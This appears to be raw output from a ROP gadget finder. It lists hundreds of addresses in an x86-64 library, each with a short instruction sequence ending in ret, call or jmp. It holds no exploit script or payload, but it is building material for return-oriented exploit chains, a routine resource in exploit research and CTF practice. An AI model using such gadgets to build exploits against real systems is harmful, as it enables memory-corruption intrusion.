0x00002aaaaab8040f : add byte ptr [rax - 0x39], cl ; rol byte ptr [rsi], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaab45101 : add byte ptr [rax - 0x3d770000], al ; je 0x7011b ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab09f15 : add byte ptr [rax - 0x3f000001], al ; shr eax, 0x1f ; ret
0x00002aaaaac5c49f : add byte ptr [rax - 0x3f000dfc], dh ; add al, 0xf2 ; call rax
0x00002aaaaab269d8 : add byte ptr [rax - 0x3f7cb7f0], cl ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaab09c0a : add byte ptr [rax - 0x3f91f09a], al ; ret
0x00002aaaaaaf491b : add byte ptr [rax - 0x3f], cl ; ret 0x4811
0x00002aaaaab9e63f : add byte ptr [rax - 0x3f], cl ; ret 0xeb11
0x00002aaaaac8639f : add byte ptr [rax - 0x46], dl ; cmc ; call rsi
0x00002aaaaab11932 : add byte ptr [rax - 0x48], cl ; ret 0xffff
0x00002aaaaaade1b7 : add byte ptr [rax - 0x4a], ah ; adc eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac74f97 : add byte ptr [rax - 0x4a], bl ; jmp 0x19ff9f
0x00002aaaaac86257 : add byte ptr [rax - 0x4b], ch ; cmc ; call rdi
0x00002aaaaac8263f : add byte ptr [rax - 0x58], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac82657 : add byte ptr [rax - 0x58], bh ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac85f0f : add byte ptr [rax - 0x59], ah ; cmc ; call rsi
0x00002aaaaac82547 : add byte ptr [rax - 0x5b], cl ; hlt ; call rax
0x00002aaaaabd3dcf : add byte ptr [rax - 0x6af0dc06], al ; ret 0xc084
0x00002aaaaac81f9f : add byte ptr [rax - 0x6d], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81fb7 : add byte ptr [rax - 0x6d], bh ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81e27 : add byte ptr [rax - 0x6f], ch ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac81e0f : add byte ptr [rax - 0x6f], dl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7af57 : add byte ptr [rax - 0x71], bl ; out dx, al ; call qword ptr [rax]
0x00002aaaaac7af6f : add byte ptr [rax - 0x71], dl ; out dx, al ; jmp qword ptr [rsi]
0x00002aaaaab0c373 : add byte ptr [rax - 0x73], cl ; adc byte ptr [r8 + 0x39], r9b ; ret
0x00002aaaaac021bf : add byte ptr [rax - 0x73], cl ; adc eax, 0x2959b9 ; mov rax, qword ptr [rdx + rax*8] ; jmp rax
0x00002aaaaac0b78f : add byte ptr [rax - 0x73], cl ; adc eax, 0x3609 ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaabea6f9 : add byte ptr [rax - 0x73], cl ; adc eax, 0x4003f ; cmove rax, rdx ; ret
0x00002aaaaab635e4 : add byte ptr [rax - 0x73], cl ; adc eax, 0xc7164 ; cmove rax, rdx ; ret
0x00002aaaaab4715f : add byte ptr [rax - 0x73], cl ; add al, 0x48 ; mov dword ptr [rax], ecx ; mov eax, dword ptr [rdx] ; pop rbx ; ret
0x00002aaaaab8156c : add byte ptr [rax - 0x73], cl ; add al, 0x4c ; lea ecx, dword ptr [rsp + 0x20] ; call rbx
0x00002aaaaaafbb0f : add byte ptr [rax - 0x73], cl ; add cl, byte ptr [rax + 0x39] ; ret
0x00002aaaaaafbaf3 : add byte ptr [rax - 0x73], cl ; add dword ptr [rax + 0x39], ecx ; ret
0x00002aaaaab01b37 : add byte ptr [rax - 0x73], cl ; add eax, 0x15f406 ; ret
0x00002aaaaaaf592f : add byte ptr [rax - 0x73], cl ; add eax, 0x16b154 ; ret
0x00002aaaaaaf593f : add byte ptr [rax - 0x73], cl ; add eax, 0x16d066 ; ret
0x00002aaaaabd273c : add byte ptr [rax - 0x73], cl ; add eax, 0x2c8854 ; ret
0x00002aaaaabd257c : add byte ptr [rax - 0x73], cl ; add eax, 0x2c8a14 ; ret
0x00002aaaaabff4ff : add byte ptr [rax - 0x73], cl ; add eax, 0x61a3e ; ret
0x00002aaaaaafbb2b : add byte ptr [rax - 0x73], cl ; add ecx, dword ptr [rax + 0x39] ; ret
0x00002aaaaab809ff : add byte ptr [rax - 0x73], cl ; clc ; ret
0x00002aaaaab80a0f : add byte ptr [rax - 0x73], cl ; cld ; ret
0x00002aaaaabf4b1f : add byte ptr [rax - 0x73], cl ; cmp eax, 0x2a7bd5 ; call rax
0x00002aaaaab92497 : add byte ptr [rax - 0x73], cl ; cmp eax, 0xd00ef ; call 0x3977a
0x00002aaaaab92496 : add byte ptr [rax - 0x73], cl ; cmp eax, 0xd00ef ; call 0x3977b
0x00002aaaaab809ef : add byte ptr [rax - 0x73], cl ; hlt ; ret
0x00002aaaaab4270f : add byte ptr [rax - 0x73], cl ; mov esi, eax ; add byte ptr [rax], al ; add byte ptr [rbp + rcx*4 + 5], cl ; ret 0x3549
0x00002aaaaab55c4a : add byte ptr [rax - 0x73], cl ; push rax ; adc dh, dh ; ret 0xf0f
0x00002aaaaab4709f : add byte ptr [rax - 0x73], cl ; push rsi ; add al, 0x48 ; mov dword ptr [rax], edx ; mov eax, dword ptr [rsi] ; pop rbx ; ret
0x00002aaaaab505d6 : add byte ptr [rax - 0x73], cl ; scasd eax, dword ptr [rdi] ; add dword ptr [rax], 0 ; add bl, ch ; fucomp st(0) ; ret
0x00002aaaaab1a0dd : add byte ptr [rax - 0x73], cl ; xor eax, 0x1cb ; call rax
0x00002aaaaab44218 : add byte ptr [rax - 0x73], cl ; xor eax, 0x30 ; call rax
0x00002aaaaab51748 : add byte ptr [rax - 0x73], cl ; xor eax, 0xffffe1e0 ; call rax
0x00002aaaaab512f8 : add byte ptr [rax - 0x73], cl ; xor eax, 0xffffe630 ; call rax
0x00002aaaaab50f08 : add byte ptr [rax - 0x73], cl ; xor eax, 0xffffea20 ; call rax
0x00002aaaaab4fea8 : add byte ptr [rax - 0x73], cl ; xor eax, 0xfffffa80 ; call rax
0x00002aaaaab4fc38 : add byte ptr [rax - 0x73], cl ; xor eax, 0xfffffcf0 ; call rax
0x00002aaaaab44511 : add byte ptr [rax - 0x73], cl ; xor eax, 0xfffffd37 ; call rax
0x00002aaaaac07b66 : add byte ptr [rax - 0x75], cl ; add al, 0x24 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac021c6 : add byte ptr [rax - 0x75], cl ; add al, 0xc2 ; jmp rax
0x00002aaaaabc4357 : add byte ptr [rax - 0x75], cl ; add byte ptr [rax + 0x39], cl ; ret 0x860f
0x00002aaaaab0f721 : add byte ptr [rax - 0x75], cl ; add byte ptr [rbx - 0x75], bl ; pop rax ; ret
0x00002aaaaac3b05f : add byte ptr [rax - 0x75], cl ; add dword ptr [rax - 0x77], ecx ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x00002aaaaac15332 : add byte ptr [rax - 0x75], cl ; add eax, 0x2840d6 ; call qword ptr [rax]
0x00002aaaaac14d1f : add byte ptr [rax - 0x75], cl ; add eax, 0x2846e9 ; call qword ptr [rax]
0x00002aaaaab55f3e : add byte ptr [rax - 0x75], cl ; add eax, 0x341e8a ; mov rdi, r14 ; call qword ptr [rax]
0x00002aaaaab51b0f : add byte ptr [rax - 0x75], cl ; add eax, 0x347a09 ; ret
0x00002aaaaab029ca : add byte ptr [rax - 0x75], cl ; add eax, 0x39541e ; mov qword ptr [rax], rdx ; ret
0x00002aaaaaafec8f : add byte ptr [rax - 0x75], cl ; add eax, 0x39ac59 ; ret
0x00002aaaaaaf6a4f : add byte ptr [rax - 0x75], cl ; add eax, 0x3a68b9 ; ret
0x00002aaaaaaf6a3f : add byte ptr [rax - 0x75], cl ; add eax, 0x3a68d9 ; ret
0x00002aaaaabd225e : add byte ptr [rax - 0x75], cl ; and al, 0xb0 ; ret
0x00002aaaaab10037 : add byte ptr [rax - 0x75], cl ; and al, 8 ; add rsp, 0x18 ; ret
0x00002aaaaab48d18 : add byte ptr [rax - 0x75], cl ; cmp byte ptr [r8 - 0x77], cl ; ret 0x2b48
0x00002aaaaab58a2f : add byte ptr [rax - 0x75], cl ; je 0x83a5e ; call rax
0x00002aaaaab58a2e : add byte ptr [rax - 0x75], cl ; je 0x83a5f ; call rax
0x00002aaaaac0744f : add byte ptr [rax - 0x75], cl ; jg 0x13249f ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x13246b ; ret
0x00002aaaaac0d5af : add byte ptr [rax - 0x75], cl ; jg 0x1385ff ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x1385cb ; ret
0x00002aaaaab50706 : add byte ptr [rax - 0x75], cl ; jmp rax
0x00002aaaaab030af : add byte ptr [rax - 0x75], cl ; jo 0x2e108 ; movsxd rdi, edi ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaab47fe6 : add byte ptr [rax - 0x75], cl ; jp 0x73031 ; jmp 0x72fb6
0x00002aaaaab030bf : add byte ptr [rax - 0x75], cl ; js 0x2e118 ; movsxd rdi, edi ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaac10c57 : add byte ptr [rax - 0x75], cl ; lodsb al, byte ptr [rsi] ; and al, 0xd0 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaaba3753 : add byte ptr [rax - 0x75], cl ; mov ebp, 0xfffffcf8 ; call r12
0x00002aaaaabc0745 : add byte ptr [rax - 0x75], cl ; mov ebp, 0xffffff78 ; call rbx
0x00002aaaaab49f6f : add byte ptr [rax - 0x75], cl ; mov rax, qword ptr [rax + 0x4c] ; ret
0x00002aaaaabab66f : add byte ptr [rax - 0x75], cl ; or byte ptr [r8 + 0x63], r9b ; ret 0xf53
0x00002aaaaac0ff57 : add byte ptr [rax - 0x75], cl ; or byte ptr [r8 - 0x75], r9b ; jmp rax
0x00002aaaaac02b7f : add byte ptr [rax - 0x75], cl ; or byte ptr [r8 - 0x77], cl ; out 0x48, al ; mov edi, ebx ; call qword ptr [rax]
0x00002aaaaaaf842f : add byte ptr [rax - 0x75], cl ; or byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaabda687 : add byte ptr [rax - 0x75], cl ; or byte ptr [rax], 1 ; add byte ptr [rax], al ; ret
0x00002aaaaabda67f : add byte ptr [rax - 0x75], cl ; pop rax ; ret
0x00002aaaaaba5dc3 : add byte ptr [rax - 0x75], cl ; pop rbp ; adc al, ch ; ret
0x00002aaaaab53b7f : add byte ptr [rax - 0x75], cl ; push rax ; or byte ptr [rax - 0x75], cl ; adc byte ptr [rcx - 0x7d], al ; ret 0x4801
0x00002aaaaabd9e27 : add byte ptr [rax - 0x75], cl ; push rbp ; rol byte ptr [rbx - 0x34d6fe3d], 1 ; ret
0x00002aaaaac26e2f : add byte ptr [rax - 0x75], cl ; push rsi ; clc ; mov qword ptr [rdi - 8], rdx ; ret
0x00002aaaaab58d37 : add byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x68 ; call rax
0x00002aaaaab9dfdf : add byte ptr [rax - 0x75], cl ; sbb byte ptr [r8 - 0x7d], r9b ; ret
0x00002aaaaabdddde : add byte ptr [rax - 0x75], cl ; sbb byte ptr [rsi - 0x7d], spl ; add byte ptr [rcx], al ; ret
0x00002aaaaab30e57 : add byte ptr [rax - 0x75], cl ; xor eax, 0x367111 ; call rax
0x00002aaaaab30801 : add byte ptr [rax - 0x75], cl ; xor eax, 0x367767 ; call rax
0x00002aaaaab25049 : add byte ptr [rax - 0x75], cl ; xor eax, 0x372f1f ; call rax
0x00002aaaaab223cd : add byte ptr [rax - 0x75], cl ; xor eax, 0x375b9b ; call rax
0x00002aaaaac5d9cc : add byte ptr [rax - 0x761d000c], cl ; hlt ; jmp rdx
0x00002aaaaabf803f : add byte ptr [rax - 0x76acfe07], al ; ror dword ptr [rdi], cl ; xchg eax, esi ; ret 0xfb83
0x00002aaaaaba3955 : add byte ptr [rax - 0x76b6ffc1], al ; cld ; je 0xce97e ; call 0x8ab7b
0x00002aaaaabd3864 : add byte ptr [rax - 0x76b7ffc8], al ; ret
0x00002aaaaabd3f42 : add byte ptr [rax - 0x76b80000], al ; ret
0x00002aaaaabebbcf : add byte ptr [rax - 0x76b80000], al ; ret 0x4875
0x00002aaaaac17a04 : add byte ptr [rax - 0x77], cl ; adc byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x00002aaaaaaf4926 : add byte ptr [rax - 0x77], cl ; adc eax, 0x3a89da ; pop rax ; pop rbx ; pop rbp ; ret
0x00002aaaaab5db21 : add byte ptr [rax - 0x77], cl ; adc ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaab5d9de : add byte ptr [rax - 0x77], cl ; add al, 0x24 ; call qword ptr [rdx]
0x00002aaaaabd2903 : add byte ptr [rax - 0x77], cl ; add eax, 0x2c6e95 ; mov rdx, rax ; jmp 0xfd8a9
0x00002aaaaac17c2f : add byte ptr [rax - 0x77], cl ; add ebx, dword ptr [rax + 0x5a] ; pop rbx ; ret
0x00002aaaaab08630 : add byte ptr [rax - 0x77], cl ; and al, 0x28 ; call 0x1f8a8
0x00002aaaaab5d66e : add byte ptr [rax - 0x77], cl ; and al, 8 ; call qword ptr [rdx]
0x00002aaaaabea87f : add byte ptr [rax - 0x77], cl ; clc ; add rsp, 8 ; ret
0x00002aaaaab0f69f : add byte ptr [rax - 0x77], cl ; clc ; cqo ; idiv rsi ; ret
0x00002aaaaab51b3f : add byte ptr [rax - 0x77], cl ; clc ; ret
0x00002aaaaab4f361 : add byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaab3fbce : add byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; ret
0x00002aaaaab58931 : add byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx - 0x3d] ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab4721c : add byte ptr [rax - 0x77], cl ; fistp word ptr [rbx + 0x48] ; mov eax, dword ptr [rax + 0x20] ; jmp rax
0x00002aaaaab47064 : add byte ptr [rax - 0x77], cl ; fistp word ptr [rbx + 0x48] ; mov eax, dword ptr [rax + 0x28] ; jmp rax
0x00002aaaaab08c47 : add byte ptr [rax - 0x77], cl ; fisttp word ptr [rax - 0x39] ; ret
0x00002aaaaac174e9 : add byte ptr [rax - 0x77], cl ; fisttp word ptr [rax - 0x75] ; and al, 0x10 ; call rax
0x00002aaaaab738ee : add byte ptr [rax - 0x77], cl ; fisttp word ptr [rax - 0x77] ; ret 0xc6e8
0x00002aaaaab5c554 : add byte ptr [rax - 0x77], cl ; fisttp word ptr [rcx + rcx*4 - 6] ; call rax
0x00002aaaaaba38cf : add byte ptr [rax - 0x77], cl ; fmul dword ptr [rax + 3] ; adc byte ptr [r8 - 0x7d], r9b ; ret
0x00002aaaaab92e76 : add byte ptr [rax - 0x77], cl ; fmul dword ptr [rax - 0x7d] ; ret
0x00002aaaaabd8365 : add byte ptr [rax - 0x77], cl ; fsubp st(0) ; ret 0xffe8
0x00002aaaaabd8265 : add byte ptr [rax - 0x77], cl ; fsubp st(0) ; ret 0xffe9
0x00002aaaaab5c7bf : add byte ptr [rax - 0x77], cl ; fucompi st(0) ; sub byte ptr [rax - 0x76b70007], al ; ret
0x00002aaaaab4519f : add byte ptr [rax - 0x77], cl ; jmp 0x48f58af8
0x00002aaaaab92925 : add byte ptr [rax - 0x77], cl ; jmp 0xffffffffbece627b
0x00002aaaaac173ed : add byte ptr [rax - 0x77], cl ; mov cl, 0xe9 ; add esi, ebx ; movsq qword ptr [rdi], qword ptr [rsi] ; ret
0x00002aaaaab42cb5 : add byte ptr [rax - 0x77], cl ; mov dh, byte ptr [rax] ; add dword ptr [rax], eax ; add bl, dh ; ret
0x00002aaaaab4d4b3 : add byte ptr [rax - 0x77], cl ; mov edx, 0x130 ; pop rbx ; ret
0x00002aaaaabfe5ec : add byte ptr [rax - 0x77], cl ; out 0x4c, eax ; mov esi, esi ; call 0x558b9
0x00002aaaaab91e76 : add byte ptr [rax - 0x77], cl ; out dx, al ; mov rdi, rbx ; call 0x89169
0x00002aaaaab5cfc5 : add byte ptr [rax - 0x77], cl ; out dx, al ; mov rdi, rbx ; call rax
0x00002aaaaac0275c : add byte ptr [rax - 0x77], cl ; out dx, eax ; call qword ptr [rbx]
0x00002aaaaabd7f21 : add byte ptr [rax - 0x77], cl ; out dx, eax ; call rbx
0x00002aaaaac00ed3 : add byte ptr [rax - 0x77], cl ; out dx, eax ; lea r9, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaab4bca3 : add byte ptr [rax - 0x77], cl ; pop rbp ; sbb al, ch ; ret
0x00002aaaaabe8b11 : add byte ptr [rax - 0x77], cl ; push rbp ; nop ; mov rdx, r13 ; call rax
0x00002aaaaabb85cc : add byte ptr [rax - 0x77], cl ; push rsp ; and al, 0x18 ; call 0x1f8a8
0x00002aaaaabe2f7a : add byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; pop r12 ; pop r13 ; ret
0x00002aaaaab58ff5 : add byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; pop r12 ; ret
0x00002aaaaaaffd35 : add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab529c2 : add byte ptr [rax - 0x77], cl ; ret 0x18eb
0x00002aaaaabfc45f : add byte ptr [rax - 0x77], cl ; ret 0x1be
0x00002aaaaab584dc : add byte ptr [rax - 0x77], cl ; ret 0x1bf
0x00002aaaaab840a8 : add byte ptr [rax - 0x77], cl ; ret 0x2944
0x00002aaaaab1c465 : add byte ptr [rax - 0x77], cl ; ret 0x2948
0x00002aaaaab36cd7 : add byte ptr [rax - 0x77], cl ; ret 0x30e8
0x00002aaaaab3b2e5 : add byte ptr [rax - 0x77], cl ; ret 0x348
0x00002aaaaab43513 : add byte ptr [rax - 0x77], cl ; ret 0x38b
0x00002aaaaab0913a : add byte ptr [rax - 0x77], cl ; ret 0x394d
0x00002aaaaab1bef4 : add byte ptr [rax - 0x77], cl ; ret 0x3dbe
0x00002aaaaab9370f : add byte ptr [rax - 0x77], cl ; ret 0x3e9
0x00002aaaaabebbd2 : add byte ptr [rax - 0x77], cl ; ret 0x4875
0x00002aaaaababbbd : add byte ptr [rax - 0x77], cl ; ret 0x8341
0x00002aaaaab04a5f : add byte ptr [rax - 0x77], cl ; ret 0x8348
0x00002aaaaabe17a3 : add byte ptr [rax - 0x77], cl ; ret 0x850f
0x00002aaaaab548ef : add byte ptr [rax - 0x77], cl ; ret 0x8548
0x00002aaaaab272b9 : add byte ptr [rax - 0x77], cl ; ret 0x858b
0x00002aaaaab0103d : add byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaab91190 : add byte ptr [rax - 0x77], cl ; ret 0x8949
0x00002aaaaab6b500 : add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaab01537 : add byte ptr [rax - 0x77], cl ; ret 0x8b41
0x00002aaaaab440c8 : add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x00002aaaaab9dc36 : add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x00002aaaaabd290a : add byte ptr [rax - 0x77], cl ; ret 0x8feb
0x00002aaaaab9d38e : add byte ptr [rax - 0x77], cl ; ret 0x9ce9
0x00002aaaaabd2465 : add byte ptr [rax - 0x77], cl ; ret 0xb6e9
0x00002aaaaabda2e5 : add byte ptr [rax - 0x77], cl ; ret 0xbc41
0x00002aaaaab52b9b : add byte ptr [rax - 0x77], cl ; ret 0xbfe9
0x00002aaaaab62a3b : add byte ptr [rax - 0x77], cl ; ret 0xc031
0x00002aaaaab19dea : add byte ptr [rax - 0x77], cl ; ret 0xc148
0x00002aaaaab278df : add byte ptr [rax - 0x77], cl ; ret 0xd5e9
0x00002aaaaab1acea : add byte ptr [rax - 0x77], cl ; ret 0xde8
0x00002aaaaabb501f : add byte ptr [rax - 0x77], cl ; ret 0xe283
0x00002aaaaab69645 : add byte ptr [rax - 0x77], cl ; ret 0xf748
0x00002aaaaab5d5b2 : add byte ptr [rax - 0x77], cl ; ret 0xff31
0x00002aaaaab4f3e0 : add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x00002aaaaab2c157 : add byte ptr [rax - 0x77], cl ; ror byte ptr [rax - 0x3f], 1 ; clc ; add cl, byte ptr [rax + 0x29] ; ret
0x00002aaaaabef0e4 : add byte ptr [rax - 0x77], cl ; ror dword ptr [rdi], -0x7b ; ret 0xfffe
0x00002aaaaac179bc : add byte ptr [rax - 0x77], cl ; sbb byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x00002aaaaabd79ed : add byte ptr [rax - 0x77], cl ; std ; xor edx, edx ; xor esi, esi ; mov rbx, rax ; call rax
0x00002aaaaabe81db : add byte ptr [rax - 0x77], cl ; xchg eax, r8d ; mov eax, dword ptr [rbx + 0x60] ; mov dword ptr [rbp - 0x80], eax ; call rcx
0x00002aaaaac0673c : add byte ptr [rax - 0x77], cl ; xor cl, byte ptr [rax - 0x77] ; jp 0x131754 ; ret
0x00002aaaaac094ac : add byte ptr [rax - 0x77], cl ; xor cl, byte ptr [rax - 0x77] ; jp 0x1344c4 ; ret
0x00002aaaaac094c4 : add byte ptr [rax - 0x77], cl ; xor cl, byte ptr [rax - 0x77] ; jp 0x1344dc ; ret
0x00002aaaaac09cfc : add byte ptr [rax - 0x77], cl ; xor cl, byte ptr [rax - 0x77] ; jp 0x134d14 ; ret
0x00002aaaaac09d14 : add byte ptr [rax - 0x77], cl ; xor cl, byte ptr [rax - 0x77] ; jp 0x134d2c ; ret
0x00002aaaaac09d44 : add byte ptr [rax - 0x77], cl ; xor cl, byte ptr [rax - 0x77] ; jp 0x134d5c ; ret
0x00002aaaaabed76f : add byte ptr [rax - 0x77], cl ; xor eax, eax ; ret
0x00002aaaaac6a054 : add byte ptr [rax - 0x786f0004], cl ; cld ; jmp qword ptr [rax]
0x00002aaaaac905b7 : add byte ptr [rax - 0x79], ch ; sti ; call rcx
0x00002aaaaab9e161 : add byte ptr [rax - 0x7af10000], al ; ret
0x00002aaaaab5fd0f : add byte ptr [rax - 0x7b], cl ; div byte ptr [rbp + 4] ; xor rax, rax ; ret
0x00002aaaaab47b0a : add byte ptr [rax - 0x7b], cl ; push qword ptr [rbp + rdi*4 - 0xa] ; ret 0x7508
0x00002aaaaab38690 : add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x84 ; ret 3
0x00002aaaaab77723 : add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; ret
0x00002aaaaabd47f1 : add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x89 ; ret 0xfffe
0x00002aaaaac0adf2 : add byte ptr [rax - 0x7b], cl ; sal byte ptr [rax + rcx*2 - 0x75], 0x50 ; adc dh, dh ; ret 0x7401
0x00002aaaaac0d333 : add byte ptr [rax - 0x7b], cl ; sal byte ptr [rbp - 0x19], 0x5b ; ret
0x00002aaaaab5f96e : add byte ptr [rax - 0x7b], cl ; sal byte ptr [rsp + rcx + 0x5b], 0x5d ; pop r12 ; ret
0x00002aaaaac857af : add byte ptr [rax - 0x7b], dh ; cmc ; jmp rax
0x00002aaaaac41017 : add byte ptr [rax - 0x7cb7fec8], al ; fdivr st(7) ; ret
0x00002aaaaabf742e : add byte ptr [rax - 0x7cf6b873], dl ; loopne 0x122439 ; add eax, 0x10 ; ret
0x00002aaaaab26fe8 : add byte ptr [rax - 0x7d], cl ; call 0xffffffffc23e67f8
0x00002aaaaabe296d : add byte ptr [rax - 0x7d], cl ; call 0xffffffffc34a217d
0x00002aaaaab57746 : add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaab36cfe : add byte ptr [rax - 0x7d], cl ; clc ; adc byte ptr [rax - 0x77], cl ; ret 0x860f
0x00002aaaaab3fd90 : add byte ptr [rax - 0x7d], cl ; clc ; add dword ptr [rax - 0x77], ecx ; ret 0x2b76
0x00002aaaaab5bd1d : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax + 0xf] ; ret 0x8348
0x00002aaaaab02b94 : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaab226d1 : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rcx - 0x77] ; ret
0x00002aaaaab23d8d : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rcx - 0x77] ; ret 0x8b4c
0x00002aaaaabcb60f : add byte ptr [rax - 0x7d], cl ; in al, dx ; or dh, dh ; ret 0x7540
0x00002aaaaac489c6 : add byte ptr [rax - 0x7d], cl ; inc dword ptr [rcx] ; ja 0x1739d7 ; ret
0x00002aaaaab59032 : add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x00002aaaaaaf5c2c : add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabc620a : add byte ptr [rax - 0x7d], cl ; ret 0x3101
0x00002aaaaabfafdf : add byte ptr [rax - 0x7d], cl ; ret 0x3108
0x00002aaaaabf7254 : add byte ptr [rax - 0x7d], cl ; ret 0x3904
0x00002aaaaab7e59f : add byte ptr [rax - 0x7d], cl ; ret 0x3a01
0x00002aaaaabd2ebf : add byte ptr [rax - 0x7d], cl ; ret 0x3c01
0x00002aaaaabf6942 : add byte ptr [rax - 0x7d], cl ; ret 0x4104
0x00002aaaaab57189 : add byte ptr [rax - 0x7d], cl ; ret 0x4117
0x00002aaaaab9326f : add byte ptr [rax - 0x7d], cl ; ret 0x4401
0x00002aaaaabf6aca : add byte ptr [rax - 0x7d], cl ; ret 0x4404
0x00002aaaaaaf6905 : add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaabb9cff : add byte ptr [rax - 0x7d], cl ; ret 0x4804
0x00002aaaaac48dff : add byte ptr [rax - 0x7d], cl ; ret 0x4810
0x00002aaaaabdd38a : add byte ptr [rax - 0x7d], cl ; ret 0x4814
0x00002aaaaab2ba07 : add byte ptr [rax - 0x7d], cl ; ret 0x481e
0x00002aaaaab7347f : add byte ptr [rax - 0x7d], cl ; ret 0x4840
0x00002aaaaaaf8de6 : add byte ptr [rax - 0x7d], cl ; ret 0x4901
0x00002aaaaaafe016 : add byte ptr [rax - 0x7d], cl ; ret 0x4904
0x00002aaaaac1928f : add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab47a27 : add byte ptr [rax - 0x7d], cl ; ret 0x4c01
0x00002aaaaabac05f : add byte ptr [rax - 0x7d], cl ; ret 0x4c04
0x00002aaaaab62f3f : add byte ptr [rax - 0x7d], cl ; ret 0x6620
0x00002aaaaab62ecf : add byte ptr [rax - 0x7d], cl ; ret 0x7e20
0x00002aaaaab093b9 : add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x00002aaaaab840df : add byte ptr [rax - 0x7d], cl ; ret 0x8301
0x00002aaaaabad167 : add byte ptr [rax - 0x7d], cl ; ret 0x8304
0x00002aaaaaaf92b7 : add byte ptr [rax - 0x7d], cl ; ret 0x8901
0x00002aaaaabbb0bf : add byte ptr [rax - 0x7d], cl ; ret 0x8908
0x00002aaaaab4195f : add byte ptr [rax - 0x7d], cl ; ret 0x8b04
0x00002aaaaab359ef : add byte ptr [rax - 0x7d], cl ; ret 0xb908
0x00002aaaaabe2a67 : add byte ptr [rax - 0x7d], cl ; ret 0xc601
0x00002aaaaabf3b45 : add byte ptr [rax - 0x7d], cl ; ret 0xe801
0x00002aaaaab622d0 : add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00002aaaaac1b273 : add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaababba7 : add byte ptr [rax - 0x7d], cl ; ret 0xeb04
0x00002aaaaac192b3 : add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaab09217 : add byte ptr [rax - 0x7d], cl ; ret 0xf01
0x00002aaaaab73aaf : add byte ptr [rax - 0x7d], cl ; rol byte ptr [rax + 0x48], 0x83 ; ret 0x4840
0x00002aaaaab5fe4f : add byte ptr [rax - 0x7d], cl ; rol byte ptr [rax + 0x49], 0x39 ; ret 0x2774
0x00002aaaaaafe7fc : add byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx + rcx*2], 0x39 ; ret
0x00002aaaaab43e54 : add byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx], 0x8b ; adc esi, esi ; ret 0xf20
0x00002aaaaab1b067 : add byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx], 0xc6 ; jmp qword ptr [rax]
0x00002aaaaab84367 : add byte ptr [rax - 0x7d], cl ; ror byte ptr [rax], 0x83 ; ret 0x4801
0x00002aaaaab909d9 : add byte ptr [rax - 0x7f], cl ; cli ; ret 0x10
0x00002aaaaac0b2c0 : add byte ptr [rax - 0x7f], cl ; in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret
0x00002aaaaab921f1 : add byte ptr [rax - 0x7f], cl ; in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0x572
0x00002aaaaab54ef1 : add byte ptr [rax - 0x7f], cl ; in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0x945
0x00002aaaaabf86f1 : add byte ptr [rax - 0x7f], cl ; in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0xff0d
0x00002aaaaab4686c : add byte ptr [rax - 0x7f], cl ; ret
0x00002aaaaac2d44b : add byte ptr [rax - 0x7f], cl ; ret 0x80
0x00002aaaaab441bf : add byte ptr [rax - 0x7f], cl ; ret 0xe8
